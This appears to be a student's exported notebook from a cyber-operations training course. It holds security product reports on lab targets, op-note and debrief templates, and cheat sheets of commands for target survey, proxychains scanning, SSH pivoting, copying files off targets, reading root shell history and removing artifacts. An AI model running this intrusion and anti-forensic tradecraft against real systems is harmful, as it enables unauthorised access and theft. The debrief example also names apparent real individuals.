yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[askar14@DESKTOP-USER24 ~]$ sudo ls -lah /var/log/messages &amp;&amp; sudo tail -n 5 /var/log/messages<br />-rw-------. 1 root root 1008K May 20 14:54 /var/log/messages<br />May 20 14:54:36 DESKTOP-USER24 audit[11735]: ADD_USER pid=11735 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=add-user id=1037 exe=&quot;/usr/sbin/useradd&quot; hostname=DESKTOP-USER24 addr=? terminal=pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11740]: USER_MGMT pid=11740 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=pam_tally2 reset=0 id=1037 exe=&quot;/usr/sbin/pam_tally2&quot; hostname=? addr=? terminal=/dev/pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11735]: USER_MGMT pid=11735 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=add-home-dir id=1037 exe=&quot;/usr/sbin/useradd&quot; hostname=DESKTOP-USER24 addr=? terminal=pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11733]: USER_END pid=11733 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:session_close grantors=pam_keyinit,pam_limits,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11733]: CRED_DISP pid=11733 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/0 res=success&#39;<br />*****End of Report*****<br /><br /><br />sudo ls -lah /var/log/messages &amp;&amp; sudo tail -n 5 /var/log/messages<br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 4and IP 192.168.169.43<br />Time: 2021/05/12 - 09:36<br />Name:  clamav<br />sudo clamscan --version<br />Version:   0.103.2/26166<br />Primary registry key / Config &amp; Installation location on *nix: /etc/clamd.d/scan.conf<br /><br />### NSDB extras ###<br />Installation folder:  /usr/share/clamav/freshclam-sleep<br />Location of logs: /var/log/clamav_daily<br />Timestamp of all associated log files: May  12 05:06<br />SeMode: na<br />Cloud based?  :no  <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[user14@desktop-admin1 ~]$ sudo ls -lah /var/log/clamav_daily &amp;&amp; sudo tail -n 5 /var/log/clamav_daily <br />-rw-r--r--. 1 root root 608 May 12 05:06 /var/log/clamav_daily<br />Data scanned: 4434.68 MB<br />Data read: 2289.65 MB (ratio 1.94:1)<br />Time: 362.730 sec (6 m 2 s)<br />Start Date: 2021:05:12 05:00:01<br />End Date:   2021:05:12 05:06:03<br />Recommendation on what to do:CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 4 and IP 192.168.169.43<br />Time: 2021/05/12 - 09:33<br />Name:  lynis<br />lynis --version<br />Version:  3.0.1 (/bin/lynis)<br />Primary registry key / Config &amp; Installation location on *nix:/etc/lynis/default.prf<br /><br />### NSDB extras ###<br />Installation folder:  /bin/lynis<br />Location of logs: /var/<strong>log</strong>/<strong>lynis</strong>.<strong>log</strong><br />Timestamp of all associated log files:May  12 13:00<br />SeMode: na<br />Cloud based?  :no <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[user14@desktop-admin1 ~]$ sudo ls -lah /var/log/lynis.log &amp;&amp; sudo head -n 5 /var/log/lynis.log<br />-rw-r-----. 1 root root 274K May 12 13:00 /var/log/lynis.log<br />2021-05-12 13:00:01 Starting Lynis 3.0.1 with PID 4763, build date 2020-10-05<br />2021-05-12 13:00:01 ====<br />2021-05-12 13:00:01 ### 2007-2020, CISOfy - <a href="https://cisofy.com/lynis/">https://cisofy.com/lynis/</a> ###<br />2021-05-12 13:00:01 Checking permissions of /usr/share/lynis/include/profiles<br />2021-05-12 13:00:01 File permissions are OK<br />Recommendation on what to do:  CM<br />*****End of Report*****<br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 6 and IP 129.168.117.54<br />Time: 2021/05/05 - 12:10<br />Name:  linux-malware-detect<br />Version:  1.6.5<br />Primary registry key / Config &amp; Installation location on *nix:/usr/local/maldetect/conf.maldet<br /><br />### NSDB extras ###<br />Installation folder:  /root/linux-malware-detect<br />Location of logs: /root/linux-malware-detect/<br />Timestamp of all associated log files:May  5 11:53 <br />SeMode: na<br />Cloud based?  :no <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[student14@dryruns-targeta-admin ~]$ sudo tail -n 5 /root/linux-malware-detect/report.txt<br />maldet(13141): {scan} scan of / (51 files) in progress...<br />maldet(13141): {scan} 51/51 files scanned: 0 hits 0 cleaned<br /><br />maldet(13141): {scan} scan completed on /: files 51, malware hits 0, cleaned hits 0, time 2s<br />maldet(13141): {scan} scan report saved, to view run: maldet --report 210505-1153.13141<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 7 and IP 192.186.169..203<br />Time: 2021/05/18 - 11:07<br />Name:  kasperski<br />Version:  Kaspersky Free 20.0<br />Primary registry key / Config &amp; Installation location on *nix:HKEY_LOCAL_MACHINE\software\KasperskyLab<br /><br />### NSDB extras ###<br />Installation folder:  C:\Program Files (x86)\Kaspersky Lab\<br />Location of logs: C:\Program Files (x86)\Kaspersky Lab\logs (does not exist, may not be logging)<br />Timestamp of all associated log files: na<br />SeMode: na<br />Cloud based? : If Security Cloud was running, yes, but in this case no. <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?na<br />Recommendation on what to do: It appears that only the kaspersky VPN is running and that the AV is not logging. Reccomend CM.  <br />*****End of Report*****<br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 8 and IP 192.169.117.205<br />Time: 2021/05/07 - 11:17<br />Name:  bitdefender<br />Version:  1.0.21.234  (reg query hklm\software\bitdefender)<br />Primary registry key / Config &amp; Installation location on *nix: hklm\software\bitdefender<br /><br />### NSDB extras ###<br />Installation folder:  C:\program files\bitdefender agent<br />Location of logs: na<br />Timestamp of all associated log files: na<br />SeMode: na<br />Cloud based? :  no<br />&gt;&gt;If yes, last 5 lines of logs: na<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 7 and IP 192.186.169.144<br />Time: 2021/05/20 - 10:28<br />Name:  avira<br />Version:  15.0.2104.2089      type &quot;C:\program files (x86)\Avira\launcher\securityproductinformation.ini&quot;<br />Primary registry key / Config &amp; Installation location on *nix: &quot;HKEY_LOCAL_MACHINE\Software\Wow6432Node\Avira&quot;<br /><br />### NSDB extras ###<br />Installation folder:  &quot;C:\program files (x86)\Avira\launcher&quot;<br />Location of logs: &quot;C:\program files (x86)\Avira\Antivirus\LOGFILES&quot; (does not exist)<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?: NO <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br />*****Security Product Report*****<br />Target:  T# 5 and IP 10.180.169.20<br />Time: 2021/05/13 - 12:13<br />Name:  Malicous software removal tool<br />Version:  5.89<br />Primary registry key / Config &amp; Installation location on *nix:HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MRT<br /><br />### NSDB extras ###<br />Installation folder:  c:\windows\system32\MRT<br />Location of logs:na<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?  :no <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />*****Security Product Report*****<br />Target:  T# lp  and IP 10.50.28.172<br />Time: 2021/05/13 - 12:36<br />Name: watchdog  <br />Version:  na<br />Primary registry key / Config &amp; Installation location on *nix:/etc/watchdog.conf<br /><br />### NSDB extras ###<br />Installation folder:  /bin/watch<br />Location of logs:na<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?  :na <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  CM (Watchdog is not configured and not doing anything).<br />*****End of Report*****<br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 5 and IP 10.101.169.30<br />Time: 2021/05/17 - 11:33<br />Name:  comodo<br />Version:  2.3<br />Primary registry key / Config &amp; Installation location on *nix: HKEY_LOCAL_MACHINE\software\COMODO\<br /><br />### NSDB extras ###<br />Installation folder:  c:\comodo.exe<br />Location of logs: na (if it would run, it would log to the current dir unless specified otherwise).<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?  :na <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br />*****Security Product Report*****<br />Target:  T# 6 and IP 192.186.169.134<br />Time: 2021/05/20 - 10:12<br />Name:  rkhunter<br />Version:  1.4.6<br />Primary registry key / Config &amp; Installation location on *nix:<br /><br />### NSDB extras ###<br />Installation folder:  <br />Location of logs:<br />Timestamp of all associated log files:/etc/default/rkhunter<br />SeMode: na<br />Cloud based?  : na<br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM <br />*****End of Report*****</div><div class='page'><h1 class='title level-4'>OpNotes</h1><br/>II.  Op Notes<br /><br />1.  Mission start / end time<br />2.  Connect / Disconnect Time for each Target<br />3.  Start and end timestamps of &quot;Upon Connection&quot; and &quot;Before Disconnect&quot; vetting command sections<br />4.  Full output of vetting commands is not required<br /><br />III.  Collection reports to Analyst<br /><br />1.  Completion of all analyst tasks (survey, collect, scanning)<br />2.  Hash all collected files on target and ops station.<br />3.  Survey Notes<br />    • Start and end timestamps of &quot;Analyst Survey Commands&quot;<br />    • Students will create a seperate file for every device they survey with the full output of the survey commands. Naming convention will be &quot;Survey_&lt;IP_Address&gt;&quot;.<br /><br />IV.  Post-op<br /><br />1.  All files go into OPSDIR.<br />2.  Submit DEBRIEF to MC.<br />      – Description plus ADMIN USER REPORT plus one sentence per target<br />3.  tar -cvf OPSDIR.tar OPSDIR/<br />4.  scp OPSDIR.tar student3@10.50.24.17:~</div><div class='page'><h1 class='title level-4'>Reporting_Old</h1><br/><strong>NOTES</strong><br />Mission Start/End Time<br />On/Off target time<br />Vetting On/Off time<br /><br /><br /><strong>NSDB</strong><br /><strong>SURVEY</strong><br />TIME Start:<br />Survey_IP<br />TIME Stop:<br /><br /><br /><br /><strong>Security Products</strong><br />TIME: <br />1. Name and version of the product:<br />2. Primary registry key:<br />3. Installation folder:<br />4. Directory location of associated logs:<br />5. Timestamp of all associated log files:<br />6. Cloud based?; yes or no:<br />7. Can we read the logs?; yes or no:<br />• If Yes, put the most recent 5 lines of logs in your NSDB File:<br />• If No, why?:<br /><br /><strong><span style="color:#ff8c00;">Reporting Security Product Template</span></strong><br />*****Security Product Report*****<br />Target: &lt;T# and IP &gt;<br />Name - &lt;&gt;<br />Version - &lt;&gt;<br />Primary registry key - &lt;&gt;<br />SeMode - &lt;&gt;<br />*****End of Report*****<br /><br /><br /><br /><strong>Malware</strong><br />TIME:<br />1. Provide process name/options, PID, Parent ID, user, and hash:<br />2. Provide file type of malware binary and supporting files:<br />3. Provide any associated logs generated by malware:<br />4. Provide location and lines of any persistence mechanisms:<br />5. Provide full path of malware files or support files:<br />6. Provide any network connections opened/established by malware:<br />7. Provide any identifiable text:<br />8. Provide any/all modules loaded by malware:<br />9. Provide brief description of malware purpose/actions and capabilities:<br /><br /><strong><span style="color:#ff8c00;">Reporting Malware Template</span></strong><br />*****Malware Report*****<br />Target: &lt;T# and IP &gt;<br />Name - &lt;&gt;<br />Hash - &lt;&gt;<br />PID - &lt;&gt;<br />PPID - &lt;&gt;<br />User - &lt;&gt;<br />File type - &lt;&gt;<br />Supporting files - &lt;&gt;<br />Associated Logs - &lt;&gt;<br />Persistence - &lt;&gt;<br />Description - &lt;&gt;<br />*****End of Report*****<br /><br /><br /><br /><strong>Abnormal Logging</strong><br />TIME:<br />1. Provide process name/options, PID, Parent ID, user:<br />2. Provide location of configuration file and it&#39;s abnormal or irregular contents:<br />3. Provide hostname or IP of where logs are being sent:<br />4. Provide any network connections opened/established by abnormal logging:<br />5. Provide brief description of the abnormal, irregular or remote logging:<br /><br /><strong><span style="color:#ff8c00;">Reporting Abnormal Logging Template</span></strong><br />*****Abnormal Logging Report*****<br />Target: &lt;T# and IP &gt;<br />Name - &lt;&gt;<br />PID - &lt;&gt;<br />PPID - &lt;&gt;<br />User - &lt;&gt;<br />Location of config file - &lt;&gt;<br />Remote hostname or IP - &lt;&gt;<br />Network connections - &lt;&gt;<br />Description - &lt;&gt;<br />*****End of Report*****<br /><br /><br /><br /><strong>Administrative Users</strong><br />TIME:<br />1. *****Privileged User Report*****<br />2. IP: <br />3. Target:#&gt;<br />4. Username:<br />5. Access Method:,&gt;<br />6. Access Time:<br />7. Activity:<br />8. Network Connections:<br />9. Description:<br />10. *****End of Report*****<br /><br /><br /><br /><strong>Debrief</strong><br /><strong><span style="color:#ff8c00;">DEBRIEF Template</span></strong><br />TIME:<br />Operator: &lt;your name&gt;<br />Operation: &lt;name of operation&gt;<br />MC: &lt;name of MC&gt;<br />Analyst: &lt;name of analyst&gt;<br />Description: &lt;two-three sentence description of operation&gt;<br /> <br /><span style="text-decoration:underline;">EXAMPLE:</span><br />Operator: SSG(P) Ryan Jay McGuinn<br />Operation: DryRun1<br />MC: Sergeant First Class Chandler II<br />Analyst: SFC Jonathan Cortez<br />Description: Goal of operation was to collect email from EMAIL3. Mission was overall successful. Operator redirected through EXT_RTR to ADMIN1 to EMAIL3. Admin was logged into T2 running a security product. ClamAV was found on EMAIL3, MC provided guidance and<br /></div><div class='page'><h1 class='title level-4'>NSDB_Working</h1><br/> Security Products2021/04/28 - 15:54<br />1. Name and version of the product: selinux<br />2. Primary registry key: /etc/selinux<br />3. Installation folder: /sys/fs/selinux<br />4. Directory location of associated logs: /var/log/audit/audit.log (or /var/log/messages)<br />5. Timestamp of all associated log files:Apr 28 19:52<br />6. Cloud based?; yes or no: no<br />7. Can we read the logs?; yes or no: yes<br />• If Yes, put the most recent 5 lines of logs in your NSDB File:<br />• If No, why?:<br />type=CRED_DISP msg=audit(1619639570.257:1600): pid=11331 uid=0 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;root&quot; AUID=&quot;student14&quot;<br />type=USER_ACCT msg=audit(1619639611.487:1601): pid=11334 uid=1014 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:accounting grantors=pam_unix,pam_localuser acct=&quot;student14&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;student14&quot; AUID=&quot;student14&quot;<br />type=USER_CMD msg=audit(1619639611.488:1602): pid=11334 uid=1014 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;cwd=&quot;/home/useraccounts/student14&quot; cmd=636174202F7661722F6C6F672F61756469742F61756469742E6C6F67 terminal=pts/2 res=success&#39;UID=&quot;student14&quot; AUID=&quot;student14&quot;<br />type=CRED_REFR msg=audit(1619639611.488:1603): pid=11334 uid=0 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;root&quot; AUID=&quot;student14&quot;<br />type=USER_START msg=audit(1619639611.491:1604): pid=11334 uid=0 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:session_open grantors=pam_keyinit,pam_limits,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;root&quot; AUID=&quot;student14&quot;<br /><br />Reporting Security Product Template<br />*****Security Product Report*****<br />Target: &lt;T#7 and IP 192.168.0.27&gt;<br />Name - &lt;selinux&gt;<br />Version - &lt;31&gt;<br />Primary registry key/etc file - &lt;/etc/selinux&gt;<br />*****End of Report*****<br /><br /><br /><br /><br />Abnormal Logging<br />TIME:2021-04-29-10:20:22--<br />1. Provide process name/options, PID, Parent ID, user:auditd, 10244, 1, root<br />2. Provide location of configuration file and it&#39;s abnormal or irregular contents:-w /home/useraccounts/student23 -p a -k student23_access<br />3. Provide hostname or IP of where logs are being sent:localhost<br />4. Provide any network connections opened/established by abnormal logging:na<br />5. Provide brief description of the abnormal, irregular or remote logging:auditd is standard nix logging tool. Specifically logging student 23 is non-standard.<br /><br />Reporting Abnormal Logging Template<br />*****Abnormal Logging Report*****<br />Target: &lt;T#1 and IP192.168.0.99 &gt;<br />Name - &lt;auditd&gt;<br />PID - &lt;10244&gt;<br />PPID - &lt;1&gt;<br />User - &lt;root&gt;<br />Location of config file - &lt;/etc/audit/rules.d/audit.rules&gt;<br />Remote hostname or IP - &lt;localhost&gt;<br />Network connections - &lt;na&gt;<br />Description - &lt;:auditd is standard nix logging tool. Specifically logging student 23 is non-standard.&gt;<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />Abnormal Logging<br />TIME:2021-04-29-12:07:06--<br />1. Provide process name/options, PID, Parent ID, user:rsyslog -n, 32683, 1, root<br />2. Provide location of configuration file and it&#39;s abnormal or irregular contents:/etc/rsyslog.conf<br />3. Provide hostname or IP of where logs are being sent:remote-host 192.168.0.99<br />4. Provide any network connections opened/established by abnormal logging:na<br />5. Provide brief description of the abnormal, irregular or remote logging:The configuration is normal. Logs are being sent to 192.168.0.99.<br /><br />Reporting Abnormal Logging Template<br />*****Abnormal Logging Report*****<br />Target: &lt;T#2 and IP 192.168.0.10&gt;<br />Name - &lt;rsyslog&gt;<br />PID - &lt;32683&gt;<br />PPID - &lt;1&gt;<br />User - &lt;root&gt;<br />Location of config file - &lt;/etc/rsyslog.conf&gt;<br />Remote hostname or IP - &lt;remote-host 192.168.0.99&gt;<br />Network connections - &lt;na&gt;<br />Description - &lt;:The configuration is normal. Logs are being sent to 192.168.0.99.&gt;<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>SA</h1><br/>• --Check selinux logs<br />sudo stat /var/log/audit/audit.log<br />sudo cat /var/log/audit/audit.log |tail<br /><br />--NMAP scan remote target(s)<br />proxychains nmap -sT -Pn -T3 -v -p &lt;port(s)&gt; 192.168.0.0/24<br /><br />--Banner grab via netcat<br />proxychains nc -nv 192.168.0.x &lt;port&gt;<br /><br />--Display Windows Logs<br />wevtutil qe &lt;System/Security/Application&gt; /c:20 /f:text<br /><br />--WIN software enumeration<br />reg query hklm\software<br /><br />--WIN software locations<br />HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall<br />##HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall &lt;alt of above&gt;<br />HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall<br />HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall<br /><br />--Windows Defender version info<br />reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Signature Updates&quot;<br /><br />--SCP with spaces in path<br />scp -vvv -o ControlPath=/tmp/T5 -P 5005 -r student5@127.1:&#39;&quot;C:\Program Files\Common Files\system\ado\*.dll&quot;&#39; ~/McCoy/Desktop/<br /><br />--Shortened windows path (SCP)<br />c:\PROGRA~1\COMMON~1\system\ado<br /><br />--Find hash in WINDOWS<br />certutil -hashfile &quot;file.png&quot; MD5<br />powershell, get-filehash -algorithm -path... -recurse<br /><br />--Generate hashes for multiple files in directory<br />for %F in (*) do @certutil -hashfile &quot;%F&quot; MD5<br /><br />--Find total file size in directory (LINUX)<br />du -ch /directory<br /><br />--Find total file size in directory (WIN)<br />dir /a /s  <br /><br />--Find PPID in windows<br />wmic process list full<br /><br />--WMIC - verify winmgmt is running prior to using <br />sc query winmgmt<br /><br />--Process info<br />wmic process where processid=&lt;PID&gt; get processid, parentprocessid, executablepath<br /><br />--Check if IPTABLES enabled<br />cat /proc/sys/net/ipv4/ip_forward (1 = enabled)<br /><br />--Enable IPTABLES Forwarding:<br />sudo sysctl -w net.ipv4.ip_forward=1<br /><br />--Check for iptables rules<br />sudo iptables -L / sudo iptables -t nat -L -nv<br /><br />--Replacement for LS<br />vdir -lisa<br /><br />--Find Linux Program Versions<br />● rpm -qa|grep &lt;programName&gt;<br />● apt-cache show &lt;programName&gt;<br />● apt policy &lt;programName&gt;<br /><br />--Find Windows Program Versions<br />Look in AppData, Program files, ETC<br />---E.g. Kaspersky 20.1.2 folder<br /><br />Remove Dynamic Port Forward from T#:<br />ssh -S /tmp/05_T# -Nf dummy@dummy -O cancel -D 9050<br /><br />Add Dynamic or Local Port Forward to T#:<br />ssh -S /tmp/05_T# -Nf dummy@dummy -O forward -D 9050<br /><br />Example:<br />ssh -S /tmp/05_T2 -Nf dummy@dummy -O cancel -L 5005:10.145.117.16:22013<br />ssh -S /tmp/05_T2 -Nf dummy@dummy -O forward -L 5005:10.145.117.16:22012<br /><br />--IF TARGET HUNG (CREATE SLAVE CONNECTION)<br />ssh -S /tmp/T5 dummy@dummy<br /><br /><br /><br /><br /><br />• <br />--SCP Commands:<br /><br />scp -o ControlPath=/tmp/T5 -P 5005 -T student5@127.1:&quot;/etc/file4.txt&quot; T5_file4.txt<br /><br />Multiple of one type of file:<br />scp -vvv -o ControlPath=/tmp/T5 -P 5005 -r student5@127.1:&#39;&quot;C:\Program Files\Common Files\system\ado\*.dll&quot;&#39; ~/McCoy/MM8_T5<br /><br />All files in a directory:<br />scp -o ControlPath=/tmp/T4 -P 5004 -r student5@127.1:&quot;C:\Windows\Prefetch&quot; ~/McCoy/MM6<br /><br />ssh -S /tmp/T5  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 5005 dummy@dummy &quot;sudo cat /root/file2.txt&quot; &gt; T5_file2.txt<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Malware Interogation</h1><br/></div><div class='page'><h1 class='title level-5'>Linux</h1><br/>• <h2>lsof </h2><br /><br />• <h2>lsmod</h2><br /><br />• <h2>find / -mmin </h2><br /><br />• <h2>(for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done)</h2><br /><br /><br /><h2>contents of /proc</h2><br /><br /><br />Persistance-Look in Cron</div><div class='page'><h1 class='title level-5'>Windows</h1><br/></div><div class='page'><h1 class='title level-4'>Linux</h1><br/>Message MC<br /><br />date; date -u<br />whoami &amp;&amp;  id &amp;&amp;  w<br />sudo cat /root/.bash_history<br />ifconfig<br />uname -a &amp;&amp; cat /etc/*rel*<br />ls -la /etc/*syslog* <br />cat /etc/rsyslog.conf | grep @<br />sudo netstat -auntp<br />ps -elfH <br />ls -latr /<br />ls -latr /tmp<br />ls -latr .<br />ls -latr ..<br />sudo ls -latr /root<br />df<br />sudo ls -latr /var/*acc*<br />ls -latr /var/*log*/<br />sudo ls -latr /var/log/*<br />for user in $(cut -f1 -d: /etc/passwd); do echo &quot;###### $user crontab is:&quot;; cat /var/spool/cron/{crontabs/$user,$user} 2&gt;/dev/null; done<br />sudo ls -latr /var/spool/cron<br />cat /etc/crontab<br />ls -la /etc/cron.*<br />sestatus<br />getenforce<br />cat ~/.bash_history<br />cat /var/log/* | grep $USER<br />date<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -14 -type f -print0 | xargs -0 ls -latr <br /><br /><br /><br /><br /><br />Before Disconnect:<br />REMOVE ARTIFACTS<br />Update Vet Disco Time Notes<br />Update MC<br /><br /><br />ls -latr /tmp<br />ps -elfH<br />sudo netstat -lptn<br />ls -latr /var/log<br />w<br />date<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -120 -type f -print0 | xargs -0 ls -latr<br /><br /><br />Update Disco Time Notes<br />Message MC<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />w<br />sudo cat /root/.bash_history<br />ls -la /etc/*syslog* <br />cat /etc/rsyslog.conf<br />sudo netstat -natup<br />ps -elfH <br />ls -latr /<br />ls -latr /tmp<br />ls -latr .<br />ls -latr ..<br />sudo ls -latr /var/*acc*<br />sudo ls -latr /var/spool/cron<br />cat /etc/crontab<br />ls -la /etc/cron.*<br />sestatus</div><div class='page'><h1 class='title level-5'>For me</h1><br/>date<br />cpu useage<br />    dmidecode   <br />    free<br />    top<br />disk usage<br />    fdisk<br />    du<br />    df              &lt;prints mounted file systems<br />    quota<br />    mount<br />    lspci        &lt;list pci bridges?? ask<br />    lsblk       &lt;list partitions<br />    lsusb       &lt;list attached usb&#39;s ??ask<br />network<br />    ifconfig<br />    ip a<br />    hostname<br />    uname -a<br />    cat /etc/ *rel*<br />processes<br />    ps -elfH<br />    lsof   &lt; malware mando<br />net connections<br />    ss -natup<br />    ss -A tcp,udp,packet<br />    netstat -natup<br />Files<br />    file<br />    strings<br />Jobs<br />    jobs<br />    cat /etc/crontab<br />Time<br />    modified time = change of contets of file<br />    access time = last time data of file was accessed<br />    change time = change of metadate (name, size, permissions)<br />touch<br />    -m update modify time<br />    -t update access and modify time<br />    nothing updates everything<br />    -a updates access only<br />    -r use another files times<br />stat<br />    shows files stat<br />    <br /><br /><br /><br /><br /><br /><br /><br /><br /><br />for i in `find /etc/*syslog* -type f | cut -d&quot;:&quot; -f 1`; do echo; echo &quot;==========$i==========&quot;; ls -l &quot;$i&quot;; cat -n &quot;$i&quot; 2&gt;&amp;1;done<br /><br />for i in `find /etc/cron* -type f | cut -d&quot;:&quot; -f 1`; do echo; echo &quot;==========$i==========&quot;; ls -l &quot;$i&quot;; sudo cat -n &quot;$i&quot; 2&gt;&amp;1;done<br /><br />Hash all files in dir and subdir<br /><h3>find . -type f -print0 | xargs -0 md5sum</h3></div><div class='page'><h1 class='title level-5'>QuickPaste</h1><br/>On Connect:<br />date; date -u<br />whoami &amp;&amp;  id &amp;&amp; w<br />uname -a &amp;&amp; cat /etc/*rel*<br />ifconfig &amp;&amp; netstat -auntp<br />ps -elfH <br />ls -latr / &amp;&amp; ls -latr /tmp &amp;&amp; ls -latr . &amp;&amp; ls -latr ..<br />sudo ls -latr /root<br />df<br />sudo ls -latr /var/*acc* &amp;&amp; ls -latr /var/*log*/ &amp;&amp; ls -latr /var/log/*<br />ls -la /etc/*syslog* <em>read </em><em><span style="text-decoration:underline;">all</span></em><em> the config files</em><br />for user in $(cut -f1 -d: /etc/passwd); do echo &quot;###### $user crontab is:&quot;; cat /var/spool/cron/{crontabs/$user,$user} 2&gt;/dev/null; done<br />sestatus<br />getenforce<br />sudo cat /root/.bash_history &amp;&amp; cat ~/.bash_history<br /><br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -&lt;<strong>duration since initial connection</strong>&gt; -type f -print0 | xargs -0 ls -latr (NOTE there is a &quot;-&quot; a.k.a minus symbol preceding the &quot;&lt;duration since initial connection&quot;&gt;<br />sudo ls -latr /var/spool/cron<br />    tail -n 1000 &lt;files in /var/spool/cron/&gt;<br />cat /var/log/* | grep <em>[logged in user account]</em><br />sudo cat /etc/crontab &amp;&amp; sudo ls -la /etc/cron.*<br />    As needed, examine the files/scripts shown in the directory listing of the cron.* directories<br /><br /><br />Before Disconnect:<br />ls -latr /tmp<br />ps -elf<br />netstat -lptn<br />ls -latr /var/log<br />w<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -&lt;<strong>yourminutesontarget</strong>&gt; -type f -print0 | xargs -0 ls -latr</div><div class='page'><h1 class='title level-5'>Survey</h1><br/>Message MC<br />Message analyst<br />Timestamp OpNotes Start<br /><br />mount<br />lsmod<br />uname -a<br />ls -latr /etc/*release*<br />cat /etc/*release*<br />cat /proc/cpuinfo<br />services --status-all || systemctl status --no-pager<br />cat 